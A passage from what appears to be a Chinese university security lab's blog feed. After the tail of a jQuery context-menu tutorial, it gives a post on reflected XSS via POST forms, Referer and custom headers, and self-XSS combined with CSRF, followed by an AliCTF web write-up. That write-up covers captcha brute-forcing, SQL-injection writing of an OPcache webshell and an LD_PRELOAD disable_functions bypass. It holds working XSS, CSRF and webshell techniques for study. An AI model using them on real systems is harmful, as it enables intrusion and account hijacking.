<h2 id="0x01-【简单实现】"><a href="#0x01-【简单实现】" class="headerlink" title="0x01 【简单实现】"></a>0x01 【简单实现】</h2><p>代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"container"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"header"</span>&gt;</span>自定义右键菜单-example1<span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="title">h1</span>&gt;</span>自定义右键菜单<span class="tag">&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"btns"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-1<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-2<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-3<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-4<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"contextMenu"</span> <span class="attribute">style</span>=<span class="value">"display:none"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>菜单一<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>菜单二<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>菜单三<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    $(<span class="string">".btns button"</span>).mousedown(<span class="function"><span class="keyword">function</span>(<span class="params">params</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(params.button == <span class="number">2</span>)&#123;</span><br><span class="line">            $(<span class="built_in">document</span>).bind(<span class="string">'contextmenu'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;);</span><br><span class="line">            $(<span class="string">"#contextMenu"</span>).css(&#123;<span class="string">'top'</span>:params.pageY+<span class="string">'px'</span>,<span class="string">'left'</span>:params.pageX+<span class="string">'px'</span>&#125;);</span><br><span class="line">            $(<span class="string">"#contextMenu"</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">    $(<span class="string">"body"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">"#contextMenu"</span>).hide();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>效果：<br><img src="http://dassec.b0.upaiyun.com/simin/pic8.png" alt="image"></p>
<h2 id="0x02-【插件】"><a href="#0x02-【插件】" class="headerlink" title="0x02 【插件】"></a>0x02 【插件】</h2><p>事实上，大神早已为我们打造好了“神器”，请戳张鑫旭的<br><a href="http://www.zhangxinxu.com/wordpress/2011/05/jquery-smartmenu%E5%8F%B3%E9%94%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%8A%E4%B8%8B%E6%96%87%E8%8F%9C%E5%8D%95%E6%8F%92%E4%BB%B6/" target="_blank" rel="external">《jQuery smartMenu右键自定义上下文菜单插件》</a></p>
<p>本文完</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/simin/pic0.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发笔记" scheme="http://das.scusec.org/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="contextmenu" scheme="http://das.scusec.org/tags/contextmenu/"/>
    
      <category term="simin" scheme="http://das.scusec.org/tags/simin/"/>
    
      <category term="上下文菜单" scheme="http://das.scusec.org/tags/%E4%B8%8A%E4%B8%8B%E6%96%87%E8%8F%9C%E5%8D%95/"/>
    
      <category term="右键菜单" scheme="http://das.scusec.org/tags/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/"/>
    
  </entry>
  
  <entry>
    <title>不常见的xss利用探索</title>
    <link href="http://das.scusec.org/2016/06/27/unusual-xss-exploit/"/>
    <id>http://das.scusec.org/2016/06/27/unusual-xss-exploit/</id>
    <published>2016-06-26T16:00:00.000Z</published>
    <updated>2016-08-24T13:49:03.187Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/wps2015/xss.jpg" alt=""><br>反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。<br><a id="more"></a></p>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。</p>
<h2 id="0x01-POST型反射xss"><a href="#0x01-POST型反射xss" class="headerlink" title="0x01 POST型反射xss"></a>0x01 POST型反射xss</h2><p>对于post反射型xss，其实已经有比较成熟的利用方法：构造post表单，利用js直接提交。表单构造如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span>  <span class="attribute">name</span>=<span class="value">"form"</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"post"</span> <span class="attribute">action</span>=<span class="value">"http://target.com/test.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">name</span>=<span class="value">"searchKey"</span> <span class="attribute">hidden</span>=<span class="value">"true"</span> <span class="attribute">value</span>=<span class="value">'test"&gt;&lt;img src=1 onerror=alert(document.domain)&gt;'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'form1'</span>).submit();</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>将html保存后，诱导被攻击者访问这个html文件，触发如下：<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2e_kZrVXXXXabXpXXXXXXXXXX_!!792076116.png" alt="post"></p>
<h2 id="0x02-http头部反射xss"><a href="#0x02-http头部反射xss" class="headerlink" title="0x02 http头部反射xss"></a>0x02 http头部反射xss</h2><p>如果xss代码的输入点是在http头部的话，那么利用表单提交的方法就不行。利用ajax异步跨域请求的方法等会再谈，先说说一个比较特殊的头信息<code>referer</code>。</p>
<h3 id="referer头信息xss"><a href="#referer头信息xss" class="headerlink" title="referer头信息xss"></a>referer头信息xss</h3><p>当浏览器进行跳转时，一般会将前一个页面的url带入referer头部中，如果我们控制了跳转前的url，并使之跳转到target页面，那么referer头的xss漏洞便可以利用。当然，chrome和firefox会对跳转前url里的”&lt;&gt;”等进行urlencode，但是IE却不会，所以这种方法在IE下适用。漏洞页面如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>简单的将referer信息输出，那么构造一个跳转：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://target.com/xss_test/referer.php"</span>;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>访问:<code>http://localhost:8088/test/header/referer_location.html?&lt;script&gt;alert(document.domain) &lt;/script&gt;</code>。在<code>IE11</code>上测试成功</p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2QcVdsXXXXXcuXXXXXXXXXXXX_!!792076116.png" alt="xss"></p>
<p>除了window.location跳转外，还可以利用iframe、表单提交等方式。利用<code>iframe</code>标签:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://target.com/xss_test/referer.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>利用<code>表单提交</code>的方式:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">form</span>   <span class="attribute">id</span>=<span class="value">"xss"</span></span><br><span class="line">          <span class="attribute">name</span>=<span class="value">"xss"</span></span><br><span class="line">          <span class="attribute">method</span>=<span class="value">"GET"</span></span><br><span class="line">          <span class="attribute">action</span>=<span class="value">"http://target.com/xss_test/referer.php"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"xss"</span>).submit();</span><br><span class="line">  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="对其他header的xss尝试"><a href="#对其他header的xss尝试" class="headerlink" title="对其他header的xss尝试"></a>对其他header的xss尝试</h3><p>如何让受害者点击某个链接后，访问漏洞页面并带上特定的header信息，ajax可以办到这点。由于需要跨域请求，这里参考了CORS(Cross Origin Resourse-Sharing)的模型。CORS模型实现跨域资源共享需要服务器端设置一定的返回头部，所以这里攻击场景就比较狭隘，仅做学术的研究。服务器端可设置的http头如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: &#20801;&#35768;&#36328;&#22495;&#35775;&#38382;&#30340;&#22495;&#65292;&#21487;&#20197;&#26159;&#19968;&#20010;&#22495;&#30340;&#21015;&#34920;&#65292;&#20063;&#21487;&#20197;&#26159;&#36890;&#37197;&#31526;&#34;*&#34;&#12290;&#36825;&#37324;&#35201;&#27880;&#24847;Origin&#35268;&#21017;&#21482;&#23545;&#22495;&#21517;&#26377;&#25928;&#65292;&#24182;&#19981;&#20250;&#23545;&#23376;&#30446;&#24405;&#26377;&#25928;&#12290;&#21363;http://foo.example/subdir/&#26159;&#26080;&#25928;&#30340;&#12290;&#20294;&#26159;&#19981;&#21516;&#23376;&#22495;&#21517;&#38656;&#35201;&#20998;&#24320;&#35774;&#32622;&#65292;&#36825;&#37324;&#30340;&#35268;&#21017;&#21487;&#20197;&#21442;&#29031;&#37027;&#31687;&#21516;&#28304;&#31574;&#30053;&#10;Access-Control-Allow-Credentials: &#26159;&#21542;&#20801;&#35768;&#35831;&#27714;&#24102;&#26377;&#39564;&#35777;&#20449;&#24687;&#65292;&#36825;&#37096;&#20998;&#23558;&#20250;&#22312;&#19979;&#38754;&#35814;&#32454;&#35299;&#37322;&#10;Access-Control-Expose-Headers: &#20801;&#35768;&#33050;&#26412;&#35775;&#38382;&#30340;&#36820;&#22238;&#22836;&#65292;&#35831;&#27714;&#25104;&#21151;&#21518;&#65292;&#33050;&#26412;&#21487;&#20197;&#22312;XMLHttpRequest&#20013;&#35775;&#38382;&#36825;&#20123;&#22836;&#30340;&#20449;&#24687;(&#35980;&#20284;webkit&#27809;&#26377;&#23454;&#29616;&#36825;&#20010;)&#10;Access-Control-Max-Age: &#32531;&#23384;&#27492;&#27425;&#35831;&#27714;&#30340;&#31186;&#25968;&#12290;&#22312;&#36825;&#20010;&#26102;&#38388;&#33539;&#22260;&#20869;&#65292;&#25152;&#26377;&#21516;&#31867;&#22411;&#30340;&#35831;&#27714;&#37117;&#23558;&#19981;&#20877;&#21457;&#36865;&#39044;&#26816;&#35831;&#27714;&#32780;&#26159;&#30452;&#25509;&#20351;&#29992;&#27492;&#27425;&#36820;&#22238;&#30340;&#22836;&#20316;&#20026;&#21028;&#26029;&#20381;&#25454;&#65292;&#38750;&#24120;&#26377;&#29992;&#65292;&#22823;&#24133;&#20248;&#21270;&#35831;&#27714;&#27425;&#25968;&#10;Access-Control-Allow-Methods: &#20801;&#35768;&#20351;&#29992;&#30340;&#35831;&#27714;&#26041;&#27861;&#65292;&#20197;&#36887;&#21495;&#38548;&#24320;&#10;Access-Control-Allow-Headers: &#20801;&#35768;&#33258;&#23450;&#20041;&#30340;&#22836;&#37096;&#65292;&#20197;&#36887;&#21495;&#38548;&#24320;&#65292;&#22823;&#23567;&#20889;&#19981;&#25935;&#24863;</span><br></pre></td></tr></table></figure></p>
<p>基于CORS模型，浏览器发起的ajax请求分为简单跨域请求和非简单跨域请求。简单跨域请求不需要服务器允许便可发起，但浏览器会阻止响应。服务器端的漏洞页面代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin: *"</span>);</span><br><span class="line">header(<span class="string">"Access-Control-Allow-Headers: X-Forwarded-For, referer, Content-Type"</span>);</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="variable">$_SERVER</span>[<span class="string">'X-Forwarded-For'</span>]);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>本地测试html代码如下，X-Forwarded-For设置为<code>&lt;html&gt;&lt;script src=http://x_for.xxxx.ceye.io&gt;&lt;/script&gt;&lt;/html&gt;</code>，通过查看cloudeye上是否有dns请求记录验证标签是否被渲染。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="keyword">var</span> xmlhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">  &#123;<span class="comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;<span class="comment">// code for IE6, IE5</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"http://taget.com/xss_test/cors.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"X-Forwarded-For"</span>,<span class="string">"%3Chtml%3E%3Cscript%20src%3Dhttp%3A%2f%2fx_for.xxxx.ceye.io%3E%3C%2fscript%3E%3C%2fhtml%3E"</span>); <span class="comment">//若不加为简单跨域请求，无OPTIONS方法的预检请求</span></span><br><span class="line">xmlhttp.send(<span class="string">'data=123'</span>);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>利用chrome打开测试页面，可以看到ajax请求发送成功，并且打开该ajax请求的Preview，可以看到似乎response的html代码被解析了。</p>
<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2VI8usXXXXXXgXpXXXXXXXXXX_!!792076116.png" alt="ajax"></p>
<p>script标签里的源是我的cloudeye地址，那么看看cloudeye里面是否有DNS记录，</p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2XvxKsXXXXXaYXXXXXXXXXXXX_!!792076116.png" alt="cloudeye"></p>
<p>DNS请求记录存在，说明html代码被浏览器解析了，到这里，似乎可以跨域触发基于header的xss了。但是经过进一步的验证过后，发现只是html代码被渲染，javascript代码却不能执行！！！</p>
<h2 id="0x03-self-xss"><a href="#0x03-self-xss" class="headerlink" title="0x03 self-xss"></a>0x03 self-xss</h2><p>self-xss可以说是最最鸡肋的xss了，攻击者只能在自己这里弹窗，一般厂商都会选择忽略self-xss。但self-xss如果和csrf结合起来，会有意想不到的效果。</p>
<blockquote>
<p>攻击场景: 某个站点个人简介处存在self-xss，并且保存后并不触发，再次编辑会触发。添加个人简介和编辑处存在csrf</p>
</blockquote>
<p>在这种场景下，有一个思路就是：利用csrf添加xss代码，并且让攻击者点击或者跳转触发。需要给被攻击者第一个链接用于csrf插入xss代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">form</span> <span class="attribute">id</span>=<span class="value">"csrf"</span> <span class="attribute">name</span>=<span class="value">"csrf"</span> <span class="attribute">method</span>=<span class="value">"POST"</span> <span class="attribute">action</span>=<span class="value">"http://target.com/info/add"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">name</span>=<span class="value">"name"</span> <span class="attribute">value</span>=<span class="value">"csrf_test#&lt;script&gt;alert(document.domain)&lt;/script&gt;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"csrf"</span>).submit();</span><br><span class="line">  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>再诱导被攻击者点击漏洞触发的链接：<code>http://target.com/info/edit</code>，亦或发送下面的跳转链接：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://target.com/info/edit"</span></span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>self-xss，结合csrf便可将鸡肋变成可攻击的漏洞。</p>
<p>参考文献：</p>
<p><a href="http://drops.wooyun.org/tips/188" target="_blank" rel="external">详解XMLHttpRequest的跨域资源共享</a></p>
<p><a href="http://zone.wooyun.org/content/11969" target="_blank" rel="external">header头referer字段反射xss利用</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/wps2015/xss.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="wps2015" scheme="http://das.scusec.org/tags/wps2015/"/>
    
      <category term="xss" scheme="http://das.scusec.org/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>alictf web writeup</title>
    <link href="http://das.scusec.org/2016/06/15/alictf-web-writeup/"/>
    <id>http://das.scusec.org/2016/06/15/alictf-web-writeup/</id>
    <published>2016-06-15T03:20:07.000Z</published>
    <updated>2016-08-24T13:19:13.312Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/ksss/alictf.jpg" alt=""><br><a id="more"></a></p>
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>web 400 homework<br>网站是一个提交作业的网站，登录验证码是输入字符的md5前四位一致则能通过验证，数字跑一下可以得到正确验证码。<!--more --></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import md5&#10;pre = &#34;5bc0&#34;&#10;for x in xrange(1, 1000000):&#10;    a = md5.md5(str(x))&#10;    m = a.hexdigest()&#10;    if m[:4] == pre:&#10;        print x&#10;        break</span><br></pre></td></tr></table></figure>
<p>进入后有一个作业提交点，可以上传任意文件，但是php文件内容会被改为badmen，在查看自己历史提交处存在SQL注入，看了一下数据库中没有敏感数据，支持union可以读写文件。</p>
<p><img src="/images/alictf_1.png" alt=""><br>首先根目录有三个提示文件：phpinfo.php;info.php和readme.html，其中phpinfo可以看到网站使用PHP7使用了OPcache。<br><img src="/images/alictf_2.png" alt=""></p>
<p>php7下的OPcache，可以通过在OPcache的缓存目录下写入x.php.bin文件，请求网站目录下的x.php文件时会加载缓存文件并解析，如果bin文件中写入webshell，则php文件将加载这段webshell代码。<br>上传时文件加时间戳重命名，目录无法绕过。OPcache的目录权限非常低，因此可以用sqli写入。目录格式为<br>/OPcache path/system ID/web path/<br>使用python程序计算出的机器码后，获得当前站的文件缓存目录为<br>/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/<br>上传2016223565-xxx.php文件，本地生成webshell bin文件，使用into dumpfile在目录写入2016223565-xxx.php.bin getshell。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>获取到shell以后在phpinfo中查看到网站disable founction中禁用了php几乎所有文件的操作函数，在phpinfo中看到启用了sendmail函数库，因此可以用LD_PRELOAD绕过php disable function。<br>编译动态库上传到服务器，php调用执行动态库中的system命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;?php&#10;putenv(&#34;LD_PRELOAD=/path/xxx.so&#34;);&#10;mail(&#34;a@localhost&#34;,&#34;&#34;,&#34;&#34;,&#34;&#34;,&#34;&#34;);&#10;?&#62;</span><br></pre></td></tr></table></figure></p>
<p>使用echo /* &gt; /tmp/file命令获取根文件目录，找到flag文件<br><img src="/images/alictf_3.png" alt=""></p>
<p>但是系统读文件命令都被清空了，使用c的文件读写，读到flag值。</p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>web 100 foundpasswd<br>系统存在很多处sql注入，甚至开始时还存在一个重复注册漏洞，因此直接可以注册HHHH，登录管理后台，然后在后台用户管理处可以联合查询。<br>loadfile下载到登录口的源代码。<br>找到用户表名和字段名。<br>在查询处获取到HHHH密码则为flag。<br>后来重复注册被修复了，xss盲打管理员cookie找到后台的联合查询注入点后select管理员密码。  </p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://dassec.b0.upaiyun.com/ksss/alictf.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全笔记" scheme="http://das.scusec.org/categories/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://das.scusec.org/tags/ctf/"/>
    
      <category term="das" scheme="http://das.scusec.org/tags/das/"/>
    
      <category term="ksss" scheme="http://das.scusec.org/tags/ksss/"/>
    
      <category term="lab" scheme="http://das.scusec.org/tags/lab/"/>
    
  </entry>
  
  <entry>
    <title>小记一次PHP对象注入</title>
    <link href="http://das.scusec.org/2016/05/19/php-obj-injection/"/>
    <id>http://das.scusec.org/2016/05/19/php-obj-injection/</id>
    <published>2016-05-19T01:45:20.000Z</published>
    <updated>2016-08-24T13:36:50.095Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://dassec.b0.upaiyun.com/cain/php.jpg" alt=""><br>最近经常会遇到一些比较有意思的漏洞，比如<strong>PHP反序列化漏洞</strong>,<strong>PHP对象注入</strong>。<br><a id="more"></a></p>
